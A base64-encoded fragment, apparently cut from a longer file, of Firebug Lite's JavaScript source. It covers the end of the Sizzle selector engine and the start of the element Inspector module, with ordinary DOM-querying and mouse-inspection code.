m9vdC5yZW1vdmVDaGlsZCggZm9ybSApOw0KICAgIHJvb3QgPSBmb3JtID0gbnVsbDsgLy8gcmVsZWFzZSBtZW1vcnkgaW4gSUUNCn0pKCk7DQoNCihmdW5jdGlvbigpew0KICAgIC8vIENoZWNrIHRvIHNlZSBpZiB0aGUgYnJvd3NlciByZXR1cm5zIG9ubHkgZWxlbWVudHMNCiAgICAvLyB3aGVuIGRvaW5nIGdldEVsZW1lbnRzQnlUYWdOYW1lKCIqIikNCg0KICAgIC8vIENyZWF0ZSBhIGZha2UgZWxlbWVudA0KICAgIHZhciBkaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsNCiAgICBkaXYuYXBwZW5kQ2hpbGQoIGRvY3VtZW50LmNyZWF0ZUNvbW1lbnQoIiIpICk7DQoNCiAgICAvLyBNYWtlIHN1cmUgbm8gY29tbWVudHMgYXJlIGZvdW5kDQogICAgaWYgKCBkaXYuZ2V0RWxlbWVudHNCeVRhZ05hbWUoIioiKS5sZW5ndGggPiAwICkgew0KICAgICAgICBFeHByLmZpbmQuVEFHID0gZnVuY3Rpb24obWF0Y2gsIGNvbnRleHQpew0KICAgICAgICAgICAgdmFyIHJlc3VsdHMgPSBjb250ZXh0LmdldEVsZW1lbnRzQnlUYWdOYW1lKG1hdGNoWzFdKTsNCg0KICAgICAgICAgICAgLy8gRmlsdGVyIG91dCBwb3NzaWJsZSBjb21tZW50cw0KICAgICAgICAgICAgaWYgKCBtYXRjaFsxXSA9PT0gIioiICkgew0KICAgICAgICAgICAgICAgIHZhciB0bXAgPSBbXTsNCg0KICAgICAgICAgICAgICAgIGZvciAoIHZhciBpID0gMDsgcmVzdWx0c1tpXTsgaSsrICkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoIHJlc3VsdHNbaV0ubm9kZVR5cGUgPT09IDEgKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0bXAucHVzaCggcmVzdWx0c1tpXSApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgcmVzdWx0cyA9IHRtcDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcmV0dXJuIHJlc3VsdHM7DQogICAgICAgIH07DQogICAgfQ0KDQogICAgLy8gQ2hlY2sgdG8gc2VlIGlmIGFuIGF0dHJpYnV0ZSByZXR1cm5zIG5vcm1hbGl6ZWQgaHJlZiBhdHRyaWJ1dGVzDQogICAgZGl2LmlubmVySFRNTCA9ICI8YSBocmVmPScjJz48L2E+IjsNCiAgICBpZiAoIGRpdi5maXJzdENoaWxkICYmIHR5cGVvZiBkaXYuZmlyc3RDaGlsZC5nZXRBdHRyaWJ1dGUgIT09ICJ1bmRlZmluZWQiICYmDQogICAgICAgICAgICBkaXYuZmlyc3RDaGlsZC5nZXRBdHRyaWJ1dGUoImhyZWYiKSAhPT0gIiMiICkgew0KICAgICAgICBFeHByLmF0dHJIYW5kbGUuaHJlZiA9IGZ1bmN0aW9uKGVsZW0pew0KICAgICAgICAgICAgcmV0dXJuIGVsZW0uZ2V0QXR0cmlidXRlKCJocmVmIiwgMik7DQogICAgICAgIH07DQogICAgfQ0KDQogICAgZGl2ID0gbnVsbDsgLy8gcmVsZWFzZSBtZW1vcnkgaW4gSUUNCn0pKCk7DQoNCmlmICggZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCApIChmdW5jdGlvbigpew0KICAgIHZhciBvbGRTaXp6bGUgPSBTaXp6bGUsIGRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgIGRpdi5pbm5lckhUTUwgPSAiPHAgY2xhc3M9J1RFU1QnPjwvcD4iOw0KDQogICAgLy8gU2FmYXJpIGNhbid0IGhhbmRsZSB1cHBlcmNhc2Ugb3IgdW5pY29kZSBjaGFyYWN0ZXJzIHdoZW4NCiAgICAvLyBpbiBxdWlya3MgbW9kZS4NCiAgICBpZiAoIGRpdi5xdWVyeVNlbGVjdG9yQWxsICYmIGRpdi5xdWVyeVNlbGVjdG9yQWxsKCIuVEVTVCIpLmxlbmd0aCA9PT0gMCApIHsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBTaXp6bGUgPSBmdW5jdGlvbihxdWVyeSwgY29udGV4dCwgZXh0cmEsIHNlZWQpew0KICAgICAgICBjb250ZXh0ID0gY29udGV4dCB8fCBkb2N1bWVudDsNCg0KICAgICAgICAvLyBPbmx5IHVzZSBxdWVyeVNlbGVjdG9yQWxsIG9uIG5vbi1YTUwgZG9jdW1lbnRzDQogICAgICAgIC8vIChJRCBzZWxlY3RvcnMgZG9uJ3Qgd29yayBpbiBub24tSFRNTCBkb2N1bWVudHMpDQogICAgICAgIGlmICggIXNlZWQgJiYgY29udGV4dC5ub2RlVHlwZSA9PT0gOSAmJiAhaXNYTUwoY29udGV4dCkgKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIHJldHVybiBtYWtlQXJyYXkoIGNvbnRleHQucXVlcnlTZWxlY3RvckFsbChxdWVyeSksIGV4dHJhICk7DQogICAgICAgICAgICB9IGNhdGNoKGUpe30NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIG9sZFNpenpsZShxdWVyeSwgY29udGV4dCwgZXh0cmEsIHNlZWQpOw0KICAgIH07DQoNCiAgICBmb3IgKCB2YXIgcHJvcCBpbiBvbGRTaXp6bGUgKSB7DQogICAgICAgIFNpenpsZVsgcHJvcCBdID0gb2xkU2l6emxlWyBwcm9wIF07DQogICAgfQ0KDQogICAgZGl2ID0gbnVsbDsgLy8gcmVsZWFzZSBtZW1vcnkgaW4gSUUNCn0pKCk7DQoNCmlmICggZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSAmJiBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSApIChmdW5jdGlvbigpew0KICAgIHZhciBkaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsNCiAgICBkaXYuaW5uZXJIVE1MID0gIjxkaXYgY2xhc3M9J3Rlc3QgZSc+PC9kaXY+PGRpdiBjbGFzcz0ndGVzdCc+PC9kaXY+IjsNCg0KICAgIC8vIE9wZXJhIGNhbid0IGZpbmQgYSBzZWNvbmQgY2xhc3NuYW1lIChpbiA5LjYpDQogICAgaWYgKCBkaXYuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgiZSIpLmxlbmd0aCA9PT0gMCApDQogICAgICAgIHJldHVybjsNCg0KICAgIC8vIFNhZmFyaSBjYWNoZXMgY2xhc3MgYXR0cmlidXRlcywgZG9lc24ndCBjYXRjaCBjaGFuZ2VzIChpbiAzLjIpDQogICAgZGl2Lmxhc3RDaGlsZC5jbGFzc05hbWUgPSAiZSI7DQoNCiAgICBpZiAoIGRpdi5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJlIikubGVuZ3RoID09PSAxICkNCiAgICAgICAgcmV0dXJuOw0KDQogICAgRXhwci5vcmRlci5zcGxpY2UoMSwgMCwgIkNMQVNTIik7DQogICAgRXhwci5maW5kLkNMQVNTID0gZnVuY3Rpb24obWF0Y2gsIGNvbnRleHQsIGlzWE1MKSB7DQogICAgICAgIGlmICggdHlwZW9mIGNvbnRleHQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSAhPT0gInVuZGVmaW5lZCIgJiYgIWlzWE1MICkgew0KICAgICAgICAgICAgcmV0dXJuIGNvbnRleHQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZShtYXRjaFsxXSk7DQogICAgICAgIH0NCiAgICB9Ow0KDQogICAgZGl2ID0gbnVsbDsgLy8gcmVsZWFzZSBtZW1vcnkgaW4gSUUNCn0pKCk7DQoNCmZ1bmN0aW9uIGRpck5vZGVDaGVjayggZGlyLCBjdXIsIGRvbmVOYW1lLCBjaGVja1NldCwgbm9kZUNoZWNrLCBpc1hNTCApIHsNCiAgICB2YXIgc2liRGlyID0gZGlyID09ICJwcmV2aW91c1NpYmxpbmciICYmICFpc1hNTDsNCiAgICBmb3IgKCB2YXIgaSA9IDAsIGwgPSBjaGVja1NldC5sZW5ndGg7IGkgPCBsOyBpKysgKSB7DQogICAgICAgIHZhciBlbGVtID0gY2hlY2tTZXRbaV07DQogICAgICAgIGlmICggZWxlbSApIHsNCiAgICAgICAgICAgIGlmICggc2liRGlyICYmIGVsZW0ubm9kZVR5cGUgPT09IDEgKXsNCiAgICAgICAgICAgICAgICBlbGVtLnNpemNhY2hlID0gZG9uZU5hbWU7DQogICAgICAgICAgICAgICAgZWxlbS5zaXpzZXQgPSBpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxlbSA9IGVsZW1bZGlyXTsNCiAgICAgICAgICAgIHZhciBtYXRjaCA9IGZhbHNlOw0KDQogICAgICAgICAgICB3aGlsZSAoIGVsZW0gKSB7DQogICAgICAgICAgICAgICAgaWYgKCBlbGVtLnNpemNhY2hlID09PSBkb25lTmFtZSApIHsNCiAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSBjaGVja1NldFtlbGVtLnNpenNldF07DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmICggZWxlbS5ub2RlVHlwZSA9PT0gMSAmJiAhaXNYTUwgKXsNCiAgICAgICAgICAgICAgICAgICAgZWxlbS5zaXpjYWNoZSA9IGRvbmVOYW1lOw0KICAgICAgICAgICAgICAgICAgICBlbGVtLnNpenNldCA9IGk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCBlbGVtLm5vZGVOYW1lID09PSBjdXIgKSB7DQogICAgICAgICAgICAgICAgICAgIG1hdGNoID0gZWxlbTsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgZWxlbSA9IGVsZW1bZGlyXTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgY2hlY2tTZXRbaV0gPSBtYXRjaDsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZGlyQ2hlY2soIGRpciwgY3VyLCBkb25lTmFtZSwgY2hlY2tTZXQsIG5vZGVDaGVjaywgaXNYTUwgKSB7DQogICAgdmFyIHNpYkRpciA9IGRpciA9PSAicHJldmlvdXNTaWJsaW5nIiAmJiAhaXNYTUw7DQogICAgZm9yICggdmFyIGkgPSAwLCBsID0gY2hlY2tTZXQubGVuZ3RoOyBpIDwgbDsgaSsrICkgew0KICAgICAgICB2YXIgZWxlbSA9IGNoZWNrU2V0W2ldOw0KICAgICAgICBpZiAoIGVsZW0gKSB7DQogICAgICAgICAgICBpZiAoIHNpYkRpciAmJiBlbGVtLm5vZGVUeXBlID09PSAxICkgew0KICAgICAgICAgICAgICAgIGVsZW0uc2l6Y2FjaGUgPSBkb25lTmFtZTsNCiAgICAgICAgICAgICAgICBlbGVtLnNpenNldCA9IGk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbGVtID0gZWxlbVtkaXJdOw0KICAgICAgICAgICAgdmFyIG1hdGNoID0gZmFsc2U7DQoNCiAgICAgICAgICAgIHdoaWxlICggZWxlbSApIHsNCiAgICAgICAgICAgICAgICBpZiAoIGVsZW0uc2l6Y2FjaGUgPT09IGRvbmVOYW1lICkgew0KICAgICAgICAgICAgICAgICAgICBtYXRjaCA9IGNoZWNrU2V0W2VsZW0uc2l6c2V0XTsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCBlbGVtLm5vZGVUeXBlID09PSAxICkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoICFpc1hNTCApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW0uc2l6Y2FjaGUgPSBkb25lTmFtZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW0uc2l6c2V0ID0gaTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoIHR5cGVvZiBjdXIgIT09ICJzdHJpbmciICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCBlbGVtID09PSBjdXIgKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoIFNpenpsZS5maWx0ZXIoIGN1ciwgW2VsZW1dICkubGVuZ3RoID4gMCApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1hdGNoID0gZWxlbTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgZWxlbSA9IGVsZW1bZGlyXTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgY2hlY2tTZXRbaV0gPSBtYXRjaDsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdmFyIGNvbnRhaW5zID0gZG9jdW1lbnQuY29tcGFyZURvY3VtZW50UG9zaXRpb24gPyAgZnVuY3Rpb24oYSwgYil7DQogICAgcmV0dXJuIGEuY29tcGFyZURvY3VtZW50UG9zaXRpb24oYikgJiAxNjsNCn0gOiBmdW5jdGlvbihhLCBiKXsNCiAgICByZXR1cm4gYSAhPT0gYiAmJiAoYS5jb250YWlucyA/IGEuY29udGFpbnMoYikgOiB0cnVlKTsNCn07DQoNCnZhciBpc1hNTCA9IGZ1bmN0aW9uKGVsZW0pew0KICAgIHJldHVybiBlbGVtLm5vZGVUeXBlID09PSA5ICYmIGVsZW0uZG9jdW1lbnRFbGVtZW50Lm5vZGVOYW1lICE9PSAiSFRNTCIgfHwNCiAgICAgICAgISFlbGVtLm93bmVyRG9jdW1lbnQgJiYgZWxlbS5vd25lckRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5ub2RlTmFtZSAhPT0gIkhUTUwiOw0KfTsNCg0KdmFyIHBvc1Byb2Nlc3MgPSBmdW5jdGlvbihzZWxlY3RvciwgY29udGV4dCl7DQogICAgdmFyIHRtcFNldCA9IFtdLCBsYXRlciA9ICIiLCBtYXRjaCwNCiAgICAgICAgcm9vdCA9IGNvbnRleHQubm9kZVR5cGUgPyBbY29udGV4dF0gOiBjb250ZXh0Ow0KDQogICAgLy8gUG9zaXRpb24gc2VsZWN0b3JzIG11c3QgYmUgZG9uZSBhZnRlciB0aGUgZmlsdGVyDQogICAgLy8gQW5kIHNvIG11c3QgOm5vdChwb3NpdGlvbmFsKSBzbyB3ZSBtb3ZlIGFsbCBQU0VVRE9zIHRvIHRoZSBlbmQNCiAgICB3aGlsZSAoIChtYXRjaCA9IEV4cHIubWF0Y2guUFNFVURPLmV4ZWMoIHNlbGVjdG9yICkpICkgew0KICAgICAgICBsYXRlciArPSBtYXRjaFswXTsNCiAgICAgICAgc2VsZWN0b3IgPSBzZWxlY3Rvci5yZXBsYWNlKCBFeHByLm1hdGNoLlBTRVVETywgIiIgKTsNCiAgICB9DQoNCiAgICBzZWxlY3RvciA9IEV4cHIucmVsYXRpdmVbc2VsZWN0b3JdID8gc2VsZWN0b3IgKyAiKiIgOiBzZWxlY3RvcjsNCg0KICAgIGZvciAoIHZhciBpID0gMCwgbCA9IHJvb3QubGVuZ3RoOyBpIDwgbDsgaSsrICkgew0KICAgICAgICBTaXp6bGUoIHNlbGVjdG9yLCByb290W2ldLCB0bXBTZXQgKTsNCiAgICB9DQoNCiAgICByZXR1cm4gU2l6emxlLmZpbHRlciggbGF0ZXIsIHRtcFNldCApOw0KfTsNCg0KLy8gRVhQT1NFDQoNCkZpcmVidWcuU2VsZWN0b3IgPSBTaXp6bGU7DQoNCi8qKiNALSovDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBJbnNwZWN0b3IgTW9kdWxlDQoNCnZhciBFbGVtZW50Q2FjaGUgPSBGaXJlYnVnLkxpdGUuQ2FjaGUuRWxlbWVudDsNCg0KdmFyIGluc3BlY3RvclRTLCBpbnNwZWN0b3JUaW1lciwgaXNJbnNwZWN0aW5nOw0KDQpGaXJlYnVnLkluc3BlY3RvciA9DQp7DQogICAgY3JlYXRlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBvZmZsaW5lRnJhZ21lbnQgPSBFbnYuYnJvd3Nlci5kb2N1bWVudC5jcmVhdGVEb2N1bWVudEZyYWdtZW50KCk7DQogICAgICAgIA0KICAgICAgICBjcmVhdGVCb3hNb2RlbEluc3BlY3RvcigpOw0KICAgICAgICBjcmVhdGVPdXRsaW5lSW5zcGVjdG9yKCk7DQogICAgfSwNCiAgICANCiAgICBkZXN0cm95OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBkZXN0cm95Qm94TW9kZWxJbnNwZWN0b3IoKTsNCiAgICAgICAgZGVzdHJveU91dGxpbmVJbnNwZWN0b3IoKTsNCiAgICAgICAgDQogICAgICAgIG9mZmxpbmVGcmFnbWVudCA9IG51bGw7DQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gSW5zcGVjdCBmdW5jdGlvbnMNCiAgICANCiAgICB0b2dnbGVJbnNwZWN0OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoaXNJbnNwZWN0aW5nKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnN0b3BJbnNwZWN0aW5nKCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5pbnNwZWN0QnV0dG9uLmNoYW5nZVN0YXRlKCJwcmVzc2VkIik7DQogICAgICAgICAgICB0aGlzLnN0YXJ0SW5zcGVjdGluZygpOw0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBzdGFydEluc3BlY3Rpbmc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlzSW5zcGVjdGluZyA9IHRydWU7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLmNocm9tZS5zZWxlY3RQYW5lbCgiSFRNTCIpOw0KICAgICAgICANCiAgICAgICAgY3JlYXRlSW5zcGVjdG9yRnJhbWUoKTsNCiAgICAgICAgDQogICAgICAgIHZhciBzaXplID0gRmlyZWJ1Zy5icm93c2VyLmdldFdpbmRvd1Njcm9sbFNpemUoKTsNCiAgICAgICAgDQogICAgICAgIGZiSW5zcGVjdEZyYW1lLnN0eWxlLndpZHRoID0gc2l6ZS53aWR0aCArICJweCI7DQogICAgICAgIGZiSW5zcGVjdEZyYW1lLnN0eWxlLmhlaWdodCA9IHNpemUuaGVpZ2h0ICsgInB4IjsNCiAgICAgICAgDQogICAgICAgIC8vYWRkRXZlbnQoRmlyZWJ1Zy5icm93c2VyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudCwgIm1vdXNlbW92ZSIsIEZpcmVidWcuSW5zcGVjdG9yLm9uSW5zcGVjdGluZ0JvZHkpOw0KICAgICAgICANCiAgICAgICAgYWRkRXZlbnQoZmJJbnNwZWN0RnJhbWUsICJtb3VzZW1vdmUiLCBGaXJlYnVnLkluc3BlY3Rvci5vbkluc3BlY3RpbmcpOw0KICAgICAgICBhZGRFdmVudChmYkluc3BlY3RGcmFtZSwgIm1vdXNlZG93biIsIEZpcmVidWcuSW5zcGVjdG9yLm9uSW5zcGVjdGluZ0NsaWNrKTsNCiAgICB9LA0KICAgIA0KICAgIHN0b3BJbnNwZWN0aW5nOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpc0luc3BlY3RpbmcgPSBmYWxzZTsNCiAgICAgICAgDQogICAgICAgIGlmIChvdXRsaW5lVmlzaWJsZSkgdGhpcy5oaWRlT3V0bGluZSgpOw0KICAgICAgICByZW1vdmVFdmVudChmYkluc3BlY3RGcmFtZSwgIm1vdXNlbW92ZSIsIEZpcmVidWcuSW5zcGVjdG9yLm9uSW5zcGVjdGluZyk7DQogICAgICAgIHJlbW92ZUV2ZW50KGZiSW5zcGVjdEZyYW1lLCAibW91c2Vkb3duIiwgRmlyZWJ1Zy5JbnNwZWN0b3Iub25JbnNwZWN0aW5nQ2xpY2spOw0KICAgICAgICANCiAgICAgICAgZGVzdHJveUluc3BlY3RvckZyYW1lKCk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLmNocm9tZS5pbnNwZWN0QnV0dG9uLnJlc3RvcmUoKTsNCiAgICAgICAgDQogICAgICAgIGlmIChGaXJlYnVnLmNocm9tZS50eXBlID09ICJwb3B1cCIpDQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS5ub2RlLmZvY3VzKCk7DQogICAgfSwNCiAgICANCiAgICBvbkluc3BlY3RpbmdDbGljazogZnVuY3Rpb24oZSkNCiAgICB7DQogICAgICAgIGZiSW5zcGVjdEZyYW1lLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgIHZhciB0YXJnID0gRmlyZWJ1Zy5icm93c2VyLmdldEVsZW1lbnRGcm9tUG9pbnQoZS5jbGllbnRYLCBlLmNsaWVudFkpOw0KICAgICAgICBmYkluc3BlY3RGcmFtZS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCg0KICAgICAgICAvLyBBdm9pZCBpbnNwZWN0aW5nIHRoZSBvdXRsaW5lLCBhbmQgdGhlIEZpcmVidWdVSQ0KICAgICAgICB2YXIgaWQgPSB0YXJnLmlkOw0KICAgICAgICBpZiAoaWQgJiYgL15mYk91dGxpbmVcdyQvLnRlc3QoaWQpKSByZXR1cm47DQogICAgICAgIGlmIChpZCA9PSAiRmlyZWJ1Z1VJIikgcmV0dXJuOw0KDQogICAgICAgIC8vIEF2b2lkIGxvb2tpbmcgYXQgdGV4dCBub2RlcyBpbiBPcGVyYQ0KICAgICAgICB3aGlsZSAodGFyZy5ub2RlVHlwZSAhPSAxKSB0YXJnID0gdGFyZy5wYXJlbnROb2RlOw0KICAgICAgICANCiAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKHRhcmcpOw0KICAgICAgICBGaXJlYnVnLkluc3BlY3Rvci5zdG9wSW5zcGVjdGluZygpOw0KICAgIH0sDQogICAgDQogICAgb25JbnNwZWN0aW5nOiBmdW5jdGlvbihlKQ0KICAgIHsNCiAgICAgICAgaWYgKG5ldyBEYXRlKCkuZ2V0VGltZSgpIC0gbGFzdEluc3BlY3RpbmcgPiAzMCkNCiAgICAgICAgew0KICAgICAgICAgICAgZmJJbnNwZWN0RnJhbWUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgICAgICAgIHZhciB0YXJnID0gRmlyZWJ1Zy5icm93c2VyLmdldEVsZW1lbnRGcm9tUG9pbnQoZS5jbGllbnRYLCBlLmNsaWVudFkpOw0KICAgICAgICAgICAgZmJJbnNwZWN0RnJhbWUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7DQogICAgDQogICAgICAgICAgICAvLyBBdm9pZCBpbnNwZWN0aW5nIHRoZSBvdXRsaW5lLCBhbmQgdGhlIEZpcmVidWdVSQ0KICAgICAgICAgICAgdmFyIGlkID0gdGFyZy5pZDsNCiAgICAgICAgICAgIGlmIChpZCAmJiAvXmZiT3V0bGluZVx3JC8udGVzdChpZCkpIHJldHVybjsNCiAgICAgICAgICAgIGlmIChpZCA9PSAiRmlyZWJ1Z1VJIikgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBBdm9pZCBsb29raW5nIGF0IHRleHQgbm9kZXMgaW4gT3BlcmENCiAgICAgICAgICAgIHdoaWxlICh0YXJnLm5vZGVUeXBlICE9IDEpIHRhcmcgPSB0YXJnLnBhcmVudE5vZGU7DQogICAgDQogICAgICAgICAgICBpZiAodGFyZy5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09ICJib2R5IikgcmV0dXJuOw0KICAgIA0KICAgICAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKGUuY2xpZW50WCwgZS5jbGllbnRZLCB0YXJnKTsNCiAgICAgICAgICAgIEZpcmVidWcuSW5zcGVjdG9yLmRyYXdPdXRsaW5lKHRhcmcpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoRWxlbWVudENhY2hlKHRhcmcpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciB0YXJnZXQgPSAiIitFbGVtZW50Q2FjaGUua2V5KHRhcmcpOw0KICAgICAgICAgICAgICAgIHZhciBsYXp5U2VsZWN0ID0gZnVuY3Rpb24oKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaW5zcGVjdG9yVFMgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChGaXJlYnVnLkhUTUwpDQogICAgICAgICAgICAgICAgICAgICAgICBGaXJlYnVnLkhUTUwuc2VsZWN0VHJlZU5vZGUoIiIrRWxlbWVudENhY2hlLmtleSh0YXJnKSk7DQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoaW5zcGVjdG9yVGltZXIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQoaW5zcGVjdG9yVGltZXIpOw0KICAgICAgICAgICAgICAgICAgICBpbnNwZWN0b3JUaW1lciA9IG51bGw7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChuZXcgRGF0ZSgpLmdldFRpbWUoKSAtIGluc3BlY3RvclRTID4gMjAwKQ0KICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGxhenlTZWxlY3QsIDApOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgaW5zcGVjdG9yVGltZXIgPSBzZXRUaW1lb3V0KGxhenlTZWxlY3QsIDMwMCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGxhc3RJbnNwZWN0aW5nID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIC8vIFRPRE86IHh4eHBlZHJvIHJlbW92ZSB0aGlzPw0KICAgIG9uSW5zcGVjdGluZ0JvZHk6IGZ1bmN0aW9uKGUpDQogICAgew0KICAgICAgICBpZiAobmV3IERhdGUoKS5nZXRUaW1lKCkgLSBsYXN0SW5zcGVjdGluZyA+IDMwKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdGFyZyA9IGUudGFyZ2V0Ow0KICAgIA0KICAgICAgICAgICAgLy8gQXZvaWQgaW5zcGVjdGluZyB0aGUgb3V0bGluZSwgYW5kIHRoZSBGaXJlYnVnVUkNCiAgICAgICAgICAgIHZhciBpZCA9IHRhcmcuaWQ7DQogICAgICAgICAgICBpZiAoaWQgJiYgL15mYk91dGxpbmVcdyQvLnRlc3QoaWQpKSByZXR1cm47DQogICAgICAgICAgICBpZiAoaWQgPT0gIkZpcmVidWdVSSIpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gQXZvaWQgbG9va2luZyBhdCB0ZXh0IG5vZGVzIGluIE9wZXJhDQogICAgICAgICAgICB3aGlsZSAodGFyZy5ub2RlVHlwZSAhPSAxKSB0YXJnID0gdGFyZy5wYXJlbnROb2RlOw0KICAgIA0KICAgICAgICAgICAgaWYgKHRhcmcubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PSAiYm9keSIpIHJldHVybjsNCiAgICANCiAgICAgICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLmxvZyhlLmNsaWVudFgsIGUuY2xpZW50WSwgdGFyZyk7DQogICAgICAgICAgICBGaXJlYnVnLkluc3BlY3Rvci5kcmF3T3V0bGluZSh0YXJnKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKEVsZW1lbnRDYWNoZS5oYXModGFyZykpDQogICAgICAgICAgICAgICAgRkJMLkZpcmVidWcuSFRNTC5zZWxlY3RUcmVlTm9kZSgiIitFbGVtZW50Q2FjaGUua2V5KHRhcmcpKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgbGFzdEluc3BlY3RpbmcgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTs